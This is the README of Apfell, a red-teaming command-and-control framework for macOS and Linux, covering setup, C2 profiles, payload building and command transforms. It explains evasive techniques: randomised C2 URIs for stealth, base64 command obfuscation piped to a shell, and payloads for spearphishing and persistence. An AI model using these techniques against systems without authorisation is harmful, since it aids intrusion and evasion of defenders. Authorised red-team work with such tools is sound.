# Apfell
A macOS, post-exploit, red teaming framework built with python3 and JavaScript. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout mac and linux based red teaming. This is a work-in-progress as I have free time, so please bear with me.

## Details
Check out my [blog post](https://its-a-feature.github.io/posts/2018/07/bare-bones-apfell-server-code-release/) on the initial release of the framework and what the bare bones content can do.
BSides Seattle 2019 Slides: [Ready Player 2: Multiplayer Red Teaming against macOS](https://www.slideshare.net/CodyThomas6/ready-player-2-multiplayer-red-teaming-against-macos)  
BSides Seattle 2019 Demo Videos: [Available on my Youtube](https://www.youtube.com/playlist?list=PLHVFedjbv6sOz8OGuLdomdkr6-7VdMRQ9)

* Current Version: 1.2

## Table of Contents
* [Apfell](#Apfell)
* [Installation](#Installation)
* [Connecting to Apfell](#Connecting-to-Apfell)
* [Quick Walkthrough to operations](#Quick-Operational-Walkthrough)
* [Users](#Users)
* [Operations](#Operations)
* [Payload Types](#Payload-Types)
  * [Payload Type Code](#Payload-Type-Code)
* [C2 Profiles](#C2-Profiles)
  * [C2 Profile Server Code](#C2-Profile-Server-Code)
  * [C2 Profile Agent Code](#C2-Profile-Agent-Code)
  * [C2 Profile Parameters](#C2-Profile-Parameters)
  * [C2 Profile start/stop debugging](#C2-Profile-Debugging)
  * [RESTful Patchthrough Example](#RESTful-Patchthrough-Example)
* [Payload Creation](#Payload-Creation)
  * [Creation and Loading](#Creation-and-Loading)
  * [Transforms](#Transforms)
  * [Payload Creation Transforms](#Payload-Creation-Transforms)
  * [Module Load Transforms](#Module-Load-Transforms)
  * [Payloads](#Payloads)
* [Commands](#Commands)
  * [Basic Command Information](#Basic-Command-Information)
  * [Command Parameters](#Command-Parameters)
  * [Command Transforms](#Command-Transforms)
  * [Command Versions](#Command-Versions)
  * [MITRE ATT&CK Mappings](#MITRE-ATT&CK-Mappings)
  * [Import/Export Commands](#Import-Export-Commands)
* [Operating](#Operating)
  * [All Tasks](#All-Tasks)
  * [Screencaptures](#Screencaptures)
  * [Uploads/Downloads](#Uploads-and-Downloads)
  * [Credentials](#Credentials)
  * [Search](#Search)
  * [Task Sharing](#Task-Sharing)
  * [Comments](#Comments)
* [Reporting](#Reporting)
* [Analytics](#Analytics)
* [Contributing](#Contributing)

## Installation

- Get the code from this github:
```bash
git clone https://github.com/its-a-feature/Apfell
```
- Important note: This is made to work with docker, so docker needs to be installed. If docker is not installed on your ubuntu machine, you can use the `./install_docker_debian.sh` to install it for you.
- The server only runs on Ubuntu. 
- The setup script will also create a default user `apfell_admin` with a default password `apfell_password` that can be used. It's recommended to change this user's password after installing though.
- Configure the installation in /Apfell/apfell-docker/app/\_\_init\_\_.py. 
```bash
# -------- CONFIGURE SETTINGS HERE -----------
db_name = 'apfell_db'
db_user = 'apfell_user'
db_pass = 'super_secret_apfell_user_password'  # used by the server to communicate with the local postgres database
# server_ip is what your browser will use to find its way back to this server
# change this to be the IP or domain name of how your operators will reach this server
server_ip = 'localhost'  
listen_port = '80'  # similarly, this is the IP the browser will use to connect back to this apfell server
# this is what IP addresses apfell should bind to locally. leave it as 0.0.0.0 unless you have a reason to specify a specific IP address
listen_ip = '0.0.0.0'  # IP to bind to for the server, 0.0.0.0 means all local IPv4 addresses
ssl_cert_path = './app/ssl/apfell-cert.pem'
ssl_key_path = './app/ssl/apfell-ssl.key'
# To help prevent unauthorized access to your login and register pages, you can use this to restrict only certain IP ranges to access these pages
# By default, it allow all netblocks, but if you wanted to only allow people on your net block, you could do something like
# whitelisted_ip_blocks = ['192.168.0.0/16','10.0.0.0/8'] -- it's important to note that no host bits can be set here
whitelisted_ip_blocks = ['0.0.0.0/0']  # only allow connections from these IPs to the /login and /register pages
# by default this is off, but you can turn it on and the server will use the above ssl_cert_path and ssl_key_path
use_ssl = False
```
- Once you're ready to finally install, simply run the setup script and then the start script and you should be good to go!
```bash
./setup_apfell.sh
./start_apfell.sh
```

## Connecting to Apfell

By default, the server will bind to 0.0.0.0 on port 80. This is an alias meaning that it will be listening on all IPv4 addresses on the machine. You don't actually browse to https://0.0.0.0:80 in your browser. Instead, you'll browse to either https://localhost:80 if you're on the same machine that's running the server, or you can browse to any of the IPv4 addresses on the machine that's running the server. You could also browse to the IP address you specified in `server_ip = 'localhost'` in the installation section.  

- All requests from the browser to the apfell server are dynamic and based on the `server_ip` and `listen_port` you specified in the `app/__init__.py` file. I cannot stress this enough that you need to set this to a routable IP address so the browser can connect remotely.

Apfell uses JSON Web Token (JWT) for authentication. When you use the browser (vs the API on the commandline), I store your access and refresh tokens in a cookie. This should be seamless as long as you leave the server running; however, the history of the refresh tokens is saved in memory. So, if you authenticate in the browser, then restart the server, you'll have to sign in again.
- Browse to the server with any modern web browser. This is where you can sign in. This url and `/register` are the ones protected by `whitelisted_ip_blocks` in the `app/__init__.py`. The default username and password here is `apfell_admin` and `apfell_password`.  

### Starting or Stopping containers

Apfell now uses docker containers for all c2 profiles and payload types. This allows us to have more control over the environments. 

Simply do `./start_c2_profiles.sh` or `./stop_c2_profiles.sh` to start/stop all c2 profiles located on the Apfell server, or you can be more granular for specific profiles like `./start_c2_profiles.sh RESTful_Patchthrough` to just start/stop a single profile.  The same can be done for payload type build servers as well.

C2 profiles and payload types cannot have spaces in the name - this allows us to have easy persistence of changes across containers starting/stopping by mapping directories into the containers.

If you want to reset the data for a specific thing, use the corresponding `reset` script. For example, `./reset_postgres_database.sh` will remove the backend database files so that you can start it fresh again.

### Creating new Containers

If you want to create a new container to use, create a new folder in `C2_Profiles` or `Payload_Types` with the name of the c2 profile or payload type. Within that folder make a new file called `Dockerfile` which contains the following:
```bash
From c2_profile_base
```
or
```bash
From payload_type_base
```

and place any other files you need in that directory as well. Then, start the container with the corresponding start script. The container will be started and will start sending heartbeat messages to the main Apfell server.

In the Apfell server, make sure to register a new PayloadType or C2Profile with the same name, and you should see the container light turn green.  If there is no heartbeat message in the last 30 seconds, then container light will flash red to indicate that something is wrong.

## Users
Everybody that uses Apfell must register an account before being able to login. The password is hashed and stored in the database (you can change your password at any time). The database keeps track of when the account was created and the last time you logged in. When you successfully authenticate, you’re given two JWTs (JSON Web Tokens) - an authentication and a refresh token. If you’re using your browser, these tokens are saved in cookies in your browser and passed with each request. The majority of Apfell interaction is through a series of RESTful interfaces and websockets that the UI wraps for ease of access. If you’re interacting with the RESTful interfaces from your own custom tool or the command line, then you need to pass these tokens along in an Authorization header.

An example usage for the Authorization header to view your own information is as follows:
```bash
curl -H "Authorization: Bearer JWT_HERE" http://localhost/me
```
More information about interacting with the RESTful API endpoints can be found within the project in the `API -> Command Lines` page. Each user has the ability to personalize all of the UI colors, and I provided a `default` and `dark theme` that can be used at any time as well. 

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/Readme_user_settings.png)  

Users are assigned to operations, which scopes what information they can see. Each operation has a lead operator and a list of other users that are currently working that operation as well. Users can be an overall ‘admin’ of Apfell, but need to be granted permission by a current 'admin'. By default, only the built-in ‘apfell_admin’ account is an admin, but this user can toggle the admin status of any other user.
 
If a user is no longer working with the group or you need to remove their access for some reason, there is the option to ‘deactivate’ an account instead of deleting it. This is the recommended process so that everything they did within the system still exists and is properly tracked. Deactivating an account simply makes it so that they can no longer log in but leaves their connections in the database. If they need access again at a later date, you can simply reactivate the account and continue on.

## Operations
Operations are a way to group everything for a single red teaming assessment together. This allows Apfell to have multiple assessments going on at a single time without them impacting each other. Each user can only see the c2 profiles, callbacks, payloads, tasks, files, etc associated with your current operation, even if you’re part of multiple operations.
 
In the main UI, you must select an operation from your assigned operations to be your `current operation`, otherwise you'll see big red letters that say `Select an Operation!` at the top of every page. You can see which operations you’re assigned to by looking at the `Manage Operations -> Operations Management` page (as shown below). The name of an operation must be globally unique, and it’s showed in the main navigation bar at the top of the screen. At any time, the lead of an operation can modify the operation to change the lead operator and add/remove other members. Once a name has been chosen though, it cannot be changed.

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_select_operations.png)

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_operations_view.png) 
Only an admin can create new operations. When an operation is completed, you can mark it as complete with the “Complete Operation” button shown above. If you no longer want the data in the database, select to delete the operation instead.

## Payload Types
A payload type is simply a way to describe metadata about a payload and to provide insight into how the payload works. For example, think of this as describing that a specific payload is written in PowerShell, works for x64 and x86 Windows, can have HTTP or raw TCP for a C2 mechanism, and needs C# compiled assemblies when it loads new functionality at run time.

I include one main payload type now, apfell-jxa, but anybody can add more at any time. I also include linfell-c (a very basic linux compiled command line runner written in c) to help illustrate an example of compiled payloads. Payload types are one of the few objects that are not specific to an operation – they’re shared globally across all operations. Let’s take a look at the apfell-jxa payload type in more detail:

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_payload_type.png) 

Payload types have a name that must be unique, a payload file extension, a template for commands, source code (seen at the bottom of the image), a list of which operating systems they support, and they indicate if they’re a wrapper for other payload types or not. In the apfell-jxa example above, the payload file extension is “.js” since it’s a JavaScript for Automation payload. JavaScript for Automation (often abbreviated JXA) is Apple’s way of providing AppleScript level functionality, but in the JavaScript language. As such, it’s a nice, scripted way of hooking into native Objective C calls and taking advantage of the higher level APIs provided by AppleScripting in general. The extension might not actually matter in the long run for your payload type, but it makes it easier to think about references while working.
 
When somebody tries to add a new command to this payload type, the base code from the command template is auto populated so that it’s easier for to create new commands. This provides an opportunity to embed any requirements, gotchas, notes about available functions, etc for anybody down the road.

### Payload Type Code

Now that we’ve discussed the metadata around payload types, let’s talk a little bit about the code. This code is the bulk of your agent’s management. Depending on the language you’re writing your agent in, there can be a lot of limitations and restrictions here. For example, scripting languages can pretty easily just have a single file here, but others like C reqire a more structured approach. The idea is the same in every case though - this is the management part of your agent. It’s the part that should store tasks, lookup functions to call, store metadata about the agent itself, and make generic requests to C2 code. I haven’t discussed the C2 section yet (that’s next), so I’ll keep this brief. When I talk about making generic requests to C2 code, it should be making requests to a set of static function wrappers that abstract away the actual implementation of the C2. This is partially how we’re going to be able to stamp in any C2 code or even swap out the C2 implementation at run time. 

Your payload type code will have `keywords` for where the C2 profile code and selected commands will go when we actually create a payload (more on that in the following sections). Even though we’re splitting these code sections up into different files in different areas of Apfell, in the end, they all need to come together in a way that makes sense for the payload type. To help indicate how all of these pieces fit together in your code, I’ve created some keyword directives that’ll help the creation process. Simply include these keywords in your agent code and they’ll be swapped out with the right information at creation time. Keep in mind, these keywords will be swapped out EVERYWHERE in your code.

|Keyword|Replaced Value|
|---	|---	|
|UUID_HERE|Place the new payload’s UUID here. This is required so that I can do tracking when you get a new callback.|
|C2PROFILE_HERE|Place the contents of the specified c2 profile here. This is mainly useful if you’re generating a single file (like a scripting payload). If you don’t include this directive and I finish processing all of the payload files, I will then copy all of the c2 profile files to the same temp directory. This is useful if your project has separate files for the c2 profile (like for a C project).|
|C2PROFILE_NAME_HERE|Place the name of the c2 profile here. Because you won’t know the name of the c2 profile ahead of time, I can place it in for you. This is useful for #include statements.|
|COMMANDS_HERE|Places the contents of all of the selected commands here. For command files, this includes everything from the beginning of the file to the string ‘COMMAND_ENDS_HERE’|
|COMMAND_COUNT_HERE|Place the number of selected commands here.|
|COMMAND_STRING_LIST_HERE|Place a comma separated list of names of the selected commands here. For example, this will be like “shell”, “ls”, “pwd” |
|COMMAND_RAW_LIST_HERE|Place a comma separated list of names of the selected commands here. For example, this will be like shell, ls, pwd|
|COMMAND_HEADERS_HERE|If your code requires separate header code (like C code needing function prototypes), then this is a way to include that information. The format of a command file is explained later.|

The timing of when these keys are used is described in the payload creation section, but I’ve included them here as reference for when you’re creating your agent code.

## C2 Profiles
A c2 profile consists of two pieces - server side code that interfaces with the default RESTful APIs and agent code that goes into a payload at creation time. I’ll cover what each of these pieces entails in the following sections. I provide two profiles initially, with more to come in the future. You can see the general information from the management page:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_c2_profiles.png)  

You can also have an arbitrary number of C2 profiles running at a time because every C2 profile that you choose to start simply runs in a sub process. Each one of these C2 profiles can bind to a port and simply acts as middleware between the default RESTful interfaces of Apfell and your C2 profile’s special sauce. C2 profiles are operation specific, so the ones you create for one operation don’t impact any other operation (aside from bound ports). When a new operation is created, I automatically copy over and register the ‘default’ and the ‘RESTful Patchthrough’ C2 profiles.

You can also use the `Import C2 Profile(s)` button to import the database information and server side code for a c2 profile. You can then upload the code for the agent side pieces that align to the different payload types you have registered.

The `Reset Default Profiles` button will delete your current working `default` and `RESTful patchthrough` c2 profiles (code on disk), then update the database information back to the default and restore the base templates for these profiles. This is pulling the code from the `app -> default_files -> c2_profiles -> default` directory structure and the database information from `app -> templates -> default_c2_db_info.json` file if you're curious.

When you create a C2 profile, there’s some information you need to provide:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_register_c2.png)  

The name must be unique within an operation, the description can be whatever you want, you need to select supported payloads, and finally upload code. As you select supported payload types, there will be additional spots to upload the agent specific code as well.

### C2 Profile Server Code

You can upload whatever you want for server code - any configuration files you want, any languages, any size. Of all the files you upload, when you start a c2 profile, Apfell will execute the file called “profileName_server”. For example, if you create a c2 profile called “Twitter profile”, then the file that will actually be executed must be called “Twitter profile_server”. 

If you want to look back at the files you’ve uploaded so far, download them, or remove them, simply click the `Edit Files` button to see the files broken out by server files and associated agent files:  

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_c2_management.png)  

The “default” c2 profile is actually just a portion of the Apfell server itself. It uses the default RESTful API calls. As such, it can’t be deleted or stopped (as indicated).

### C2 Profile Agent Code

In addition to the server code that will execute on the Apfell server, there needs to be another component that will be placed into the agent - the agent code.  You can see in the above images the “Supported Payloads” selection. Not every payload type needs to support every c2 profile, so it’s up to you to pick which ones you want to support with which payload types.

This code is the implementation of the generic functions you call in your payload type code. If your agent makes a call to a generic “getNextTask()” function, then this is where you’ll actually define what that function does. This means that ideally any C2 profile that supports your agent needs to implement this function so that you can swap them out without any issues.

Take a slightly more complicated example - the linfell-c payload type has two files associated with the default c2 profile. 

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_default_c2_files.png)  

### C2 Profile Parameters

Every C2 profile can specify the parameters that are needed by the agent. These parameters are used when creating a payload and have three components:

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_c2_parameters.png)  

The `name` must be unique within a c2 profile and is displayed to the user when they create a payload. The `key` is the unique value within the c2 profile agent’s code that will be swapped out with the user’s input. The `User Hint` is what’s displayed to the user when creating a payload to help the operator know what to put. You can see the correlation between the above screenshot and what the user sees when creating a payload:

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_create_c2.png)  

In the `default` and `RESTful Patchthrough` C2 profiles, there are some interesting options involving encryption. When an operation is created, a random, 32bit AES key is generated and saved. The base64 of this value is auto populated into any C2 profile parameter where the `key` is `AESPSK` (which you can see in the above screenshots). If this parameter has a value, then the profile will use it to encrypt all communications with the server. Additionally, if the `Encrypted Key Exchange` value is `T`, then this `AES Pre-shared key` value is used for initial communications to the server to help negotiate a new 32bit AES key per callback that will be used. This is extremely similar to the method used by [Empire](https://www.powershellempire.com/?page_id=147).

### C2 Profile Debugging
For all c2 profiles other than the default one, you can start and stop them at will. When you start one, I get the first few seconds of output to display back in case there are any errors. For example, when you start the RESTful Patchthrough c2 profile:

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_start_c2.png)  

For the RESTful Patchthrough profile specifically, it returns information about the different threads it starts (more info in the next section). Due to the way that I do the asynchronous subprocesses for all c2 profiles, any data that goes to STDOUT/STDERR is buffered until you read it (pressing the status button), so I highly suggest intentionally not writing a lot of data to stdout or stderr for your C2 profiles once you've finished debugging.

At any time, you can select the `Status` button if the profile is running to view a few lines of buffered stdout/stderr as well. This can be really helpful when debugging c2 profiles that are running.

### RESTful Patchthrough Example
Using the default C2 Profile (i.e. Apfell’s native RESTful endpoints) is not exactly covert and is very static. So, to help with this, I created a quick RESTful Patchthrough C2 profile that you can configure to be a bit stealthier. This does a few things for you:
* Allows you to customize the endpoints to whatever you want
* Gives some randomization to each request (not a hard requirement, but implemented in the apfell-jxa payload)
* Allows you to have multiple endpoints available at a time (each with their own port and SSL encryption)

Let’s look into this a bit more. When you run this profile, I’m standing up new threads that run basic HTTP(S) servers that are simply patching your HTTP(S) requests through to the default RESTful interfaces (hence the name). You probably noticed from one of the above screenshots that in addition to the _server file, there is a config file:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_patchthrough_config.png)  

This config file allows you to specify as many “instances” of the RESTful Patchthrough C2 profile as you want. Make sure that you update the `apfellBase` with any modifications you set when configuring your Apfell Server (such as HTTP vs HTTPS and a port other than 80). Each `instance` has a few parameters, most of which are self explanatory. The interesting ones are the GET and POST configurations. For each instance, these specify regex patterns that will be used to match the incoming request and route it out to the appropriate default RESTful interface. Let’s take this default configuration for example. Any incoming request that starts with “/admin.php?q=“, followed by some number, will get patched through to the apfellNextTask url at the bottom. This “some number” is actually the callback id and will be slotted into the “{}” in the apfellNextTask string. Now, this means that you can have whatever else you want at the end of that URI because the regex doesn’t care. It only matters that the regex matches exactly one of those URLs per GET/POST for each instance. 

Once you have that set up how you want, you can look at the profile parameters:  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_patchthrough_parameters.png)  

You can see that they match up with some of the default c2 profile parameters and the RESTful patchthrough endpoints. Also note that the `IDSTRING` matches up with the capture groups from the regex, it’s important that these two things match up. 

If we leave our parameters like this, then you still have pretty static requests. We can do better. 

For the apfell-jxa agent code for this c2 profile, I’ve added in one more fun feature - a few randomization directives. 
* (A#) - on each request, generate # of random alphabet letters
* (N#) - on each request, generate # of random numbers
* (M#) - on each request, generate # of random alphanumerics
Combine these with the fact that you’re still only doing regex matching on the URI and you can specify some interesting strings for your agent to use:

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_patchthrough_endings.png)  

These substitutions and randomizations will happen on every GET/POST, so given sufficiently long sequences, you should never have two that look the same. This is nowhere even close to something as sophisticated as Cobalt Strike’s Malleable C2, but it’s a fun tweak to a common fixed scheme. 

Just remember that the the values specified when creating your payload must match with at least one of the regex instances in your config file.

## Payload Creation
Payload creation takes place in a few steps:
1. User specifies payload type, c2 profile, output location, c2 profile parameter values, default tag, and any commands that should initially be in the payload
2. Copy all required files to a temporary location
   * Payload files and C2 profile files
3. Iterate over these files to stamp in user supplied parameters
   * This includes stamping in selected commands
4. Perform any final payload creation transforms
5. Make sure the final payload ends up where the user specified
6. Remove all of the temporary files

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_create_payload.png)  

To help with better tracking of payload creation, information, and use throughout an operation, I added in a few ways to provide meaningful information back to the users. When specifying a default tag for a payload, it’s important to think of why you’re creating that payload. This default tag is what will auto populate the callback `description` field. This means you can create payloads specifically for spearphishing or persistence, and when you get a new callback, you’ll immediately which payload was executed. 

While iterating through the payload files for the keywords specified in the `Payload Types` section, if “C2PROFILE_HERE” is encountered, I will first go through the c2 profile code and swap out the parameter values before writing that code to the designated spot. If I don’t find that directive in the payload code, then I will copy over each file from the c2 profile individually and perform the parameter swapping on each file. This is a good differentiation between when you’re aggregating all of the files together into a single script, or if you’re just aggregating them together for compilation.

Of all the commands registered with the payload, you can select the ones you want stamped into the initial payload. This allows you to have a bit more flexibility and not just deploy the same payload every time, it can be bare bones (like the above screenshot) or include all of your commands. I prefer to keep it minimal because if it gets caught, you’re not burning all of your techniques. Additionally, if you structure your code right, there will be no indication of what any of the other functionality could be.

### Creation and Loading
One of the goals of Apfell is to help reduce static indicators in our payloads so that defenders must focus analytics for the malicious behaviors. To help with this, I designed Apfell to heavily leverage source code when creating payloads. However, many payloads still need to be compiled, encrypted, packed, or any number of other things after the source code is all put together. That’s where some Transforms come into play.

### Transforms
Transforms are simply small python functions that can be applied at a few different stages. Right now, these functions can be edited, created, and removed by all users. Because you can edit these functions at any time (via the Transforms Management page seen below), I reload the current instance of the python code right before each use. This helps make sure that you’re always using the most updated transform code without having to restart the Apfell server each time. 

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_transform_code.png)  

So, what do these transforms really do and how do they work? Well, there are three main aspects right now – payload creation transforms, module load transforms, and command transforms. The first two are using the same transforms but are used at different points in the operating cycle, so they’re configured independently. Payload creation and Module load transforms are global across all operations (set it in one operation and it’s reflected in all of the others), but command transform applications are specific to an operation. The rationale for this is that the first two transform types are just inherent to how that payload type works, but the command transforms are more of a ‘secret sauce’ per operation.
 
Python 3 offers the ability to do type hinting in function definitions, which allows us to specify not only a parameter name, but what data type we should expect there. I use these type hints to pass information back up to the operator so that they can correctly chain sequence of transforms. The output of one transform is fed as the input to the next transform, so it’s important to match up the types to achieve your end goal.

### Payload Creation Transforms
After a payload file (or files) is created with the base payload type code, the selected commands, and c2 profile code, then a series of transforms can be applied. The most common example of this would be to now compile this code into an executable or library. After these transforms are applied, the final output is what’s registered in the database as the payload, and any intermediary files are removed.

Let’s take an example with the basic linfell-c code. When creating the payload type, I specify the following two payload creation transforms:

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_linfell_create_transforms.png)  

1. preprocessFilePaths
   * Parameter: gcc -pthread -w -fPIC {{input}}*.c -o {{output/compiled.o}} -lssl -lcrypto -ldl
2. preprocessCompile

After all of the code is stamped together, I have all of my necessary .c and .h files in some temporary location (it’s actually in `./app/payloads/operations/operation_name/payload_uuidhere/`), but you won’t know that exact path ahead of time. Additionally, remember that you set this compile command on the payload type in general. So regardless of where you actually specify for the final output, this will execute the same way. I provide two directives to help with this scenario:
* `{{input}}` - This will get replaced with the path to the directory where all of these temp files live. So, it’ll become `./app/payloads/operations/default/someuuid/` for this case. 
  * In my compile command, I want to pass all of the `*.c` files on the command line to gcc, so I can simply do `{{input}}*.c` (notice that there's already a trailing / at the end of the directive)
* `{{output/filename}}` - This one is more interesting. I need a way of knowing what the final file is from all of these stamping of files and transforms. At the end of all the payload creation transforms, the final output should be the path to the final payload. So, you can use `{{output/filename}}` to indicate the name of the final file from your task. In this case, `{{output/compiled.o}}` will get translated to `./app/payloads/operations/default/uuidhere/compiled.o`. This will be the output location of the compile and returned as the last file path. So, I will then copy this `compiled.o` file to the location specified by the user as the name and location of their final file before removing the whole temporary directory.

You can string together as many transforms as you want and specify their order, but the very last one needs to indicate the location of your final payload. 

### Module Load Transforms
When tasked to load a new module into a callback, we need to turn the raw code in our command files into something the agent can actually leverage. Sometimes this simply means base64 encoding it, sometimes it’s removing extra slashes (or adding them in), or sometimes it means to actually compile it into a library that can then be loaded. Unlike payload creation transforms, module load transforms start out with a list of file paths to read (since you can load multiple commands at once). The end result of these transforms should be a file path to register or an array of bytes to write out to a file. This file is registered in the database and given a `file_id` number – this is what the agent actually uses to pull down the new command file.You can either specify a specific output file or leave it to be auto generated (this is easiest). If you leave it to be auto generated, then Apfell will delete the file after it’s been pulled down by the agent. This is done to try to keep a clean house and prevent a cluttering of temporary files.

Let’s take the apfell-jxa load process as an example:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_load_jxa.png)  

Remember that the transforms all chain together with the first part being a list of file paths. In this scenario, assume I tasked a command like `“load shell, ls, pwd, cat”` to load those four commands into a specific callback. Those get changed into a list of file paths to each command file. Those commands are read in and become lists of bytes, which are then all aggregated together into a single byte array. I purposefully leave this fine grained so that you have the option to do something specific per file, instead of just working on the aggregate. You could easily write your own single transform to do what you want without stringing them together too.  I then convert all of these bytes to a string. Due to the apfell-jxa payload being JavaScript and the way I load in commands, I have to worry about slashes. So, I remove instances of double slashes (i.e. \\n would become \n). I then convert this final string to a byte array and let Apfell automatically write it out to a temporary file.

Notice that I don’t supply a final path. This means that this array of bytes is written out to a temp location and deleted after the agent has pulled it down.

## Payloads
So, we went through all of that and created a payload. What does that mean for us? For starters, we now know a lot about a payload. Take the following example:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_payload_management.png)  

If we click `Config` we can see more detailed information:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_payload_config.png)  

We know which c2 profile this payload uses and all of the parameters we used when we created it. We also know which commands are loaded into it (and their versions). If we update the command on the Apfell server, then we’ll be able to see this reflected in the config as well:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_payload_config_outdated.png)  

At a higher glance, we can see when the payload was created, who created it, and where it’s located as well. We can also see the default tag that’s associated with the payload. You can of course delete these payloads from disk and mark them as ‘deleted’ in the database. I don’t let you actually delete them from the database here because if you delete these objects from the database, then anything they’re tied to gets deleted as well (such as callbacks). You can also download your payloads directly from here.

## Commands
Commands keep track of a wealth of information such as the actual code, command name, description, help information, if it needs admin permissions, the current version, any parameters, transforms, artifacts, att&ck mappings, which payload type the command corresponds to, who created or last editing the command, and when. That is a lot of information, so let’s break that down a bit.

### Basic Command Information
Let’s use the apfell-jxa command as an initial example. You can browse/edit the code and any of the features right through the UI.
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_edit_command.png)  

At a basic level, each command is tied to a specific payload type. Each command name must be unique within that payload type and cannot contain spaces, but every payload type can have its own `shell` command. The description field allows you to provide a detailed description of what the command does and how it works under the hood. The help section is a short description of how to actually run the command and any immediately useful information. If a user types `help command_name` when interacting with a callback, this is the information they’re presented with. 
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_help_command.png)  

The `Needs Admin` flag is currently just an indicator to the operator about whether or not they need elevated permissions to use the command, but there’s no check on the server side to make sure you obey this. The last basic piece of a command is the code itself. When you try to add a new command, the code field will be auto populated with the command template specified for that payload type. You can either edit the code in the text area provided here or you can choose to upload your own code. If you do both, the uploaded code will take precedence.

All of this information is used to auto-populate some help documentation as well at `API -> Payload Type Command Help` where you can just select the payload type you're interested in:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_payload_type_help.png)  

All commands that have the “needs_admin” set to True are highlighted for easier readability by the operator. You can simply select the dropdown for your payload type and see all of the associated documentation.

### Command Parameters
Every command is different – some take no parameters, some take arrays, strings, integers, or a number of other things. To help accommodate this, you can add parameters to commands so that operators know what they need to be providing. You must give each parameter a name and they must be unique within that command. You can also indicate if the parameter is required or not.

You can then specify what type of parameter it is from the following: 
* String
* Credential
* Number
* Array
* Boolean
* Choose One
* Choose Many
* File 

If you choose String, then you can provide a `hint` which is just placeholder text to help describe what the operator should be putting there (like a file path for example). If you choose Credential, then you’ll be able to select a field from any of the current credentials stored for the operation (more on this later). If you select one of the `Choose` options, then you provide choices (one per line) that the user can select from. Lastly, if you choose File, then you’ll be allowed to upload a file via the GUI when you type out the command. In this case, the file is uploaded, registered in the database, and given a file_id number – this number is then what gets passed to the agent.

The following example from the `shell_elevated` command illustrates a few of these concepts when editing a command:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_shell_elevated.png)  

When the time comes for the operator to enter commands at the command line, if there are parameters associated with the command and the operator doesn’t type any out, then a dialog box will pop up with this information available for the operator to fill out. This information will be turned into a JSON blob which then gets sent to the Apfell server. In the end, all agents get a JSON blob of two things – a command string and a string of the parameters. In most cases, the parameters string is actually a JSON string which can be parsed on the agent side. This makes it pretty easy to handle complex parameters without requiring the Apfell server or agent to do complicated string parsing.

Here’s that same `shell_elevated` command, but typed at the command line without any arguments:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_shell_elevated_prompt.png)  

In the end, that gets translated to the following for the agent to actually process:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_shell_elevated_cmdline.png)  

### Command Transforms
While the existence of a command (and the command parameters) is across all operations, a command’s transforms are unique to the operation. As briefly discussed in the transforms section, command transforms are applied to a command right before it gets saved in the database as a task for an agent. These transforms are performed in the specific order with one exception – if they’re not set to active. In addition to specifying a series of transforms, you’re able to toggle them to be active or not. This active status can be across the entire operation, and it can be toggled per task that you issue. Additionally, you can toggle the `test command` flag which won’t actually save the task in the database, but instead will return back what the output was from each transform. This is helpful for debugging or testing that your command will look how you want before you finally send it down.

Let’s look at what I mean by this. For the apfell-jxa shell command, I’ll create and add in a simple command obfuscator (i.e. base64 encode the command, pipe it to a decoder, and then pipe to shell). For the operation wide specifics, you set them in the payload management page when editing a command:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_set_command_transform.png)  

Notice that all of the command transforms allow you to supply a parameter if you want. Now that we have one, what does this look like while we’re operating? When typing a command, if there are either no transforms set on the command or if none of them are active, you’ll see the cogs on the far right as green:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_green_gears.png)  

The moment you type a command that has active transforms set on it, it’ll turn orange. If you click on it, you’ll get a more detailed popup:  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_toggle_transforms.png)  

You can manually toggle each one as on/off and they’ll stay that way until you refresh the page and they get reset back to the global values for that operation. Additionally, if you want your version of on/off to become the global version, simply click `persist`. If you want to test what’ll actually happen to you command, you can switch the `Test command?` to on and then submit your task. This won’t actually submit this as a task to the agent, but will show you what would have happened in each stage along the way. In our toy example I get the following:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_test_command.png)  

Now, assuming you decide you want to go ahead and use those transforms, Apfell keeps track of what you actually submitted before the transforms and at the end. This allows operators to do things like command line obfuscation without having to worry about what the original command was. For example:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_issue_task.png)  

Since the final command can be unwieldy depending on what you’re doing (some obfuscation techniques really blow up in size), I hide the data with a button. If you want to actually see what was sent to the agent, you can click the button though:
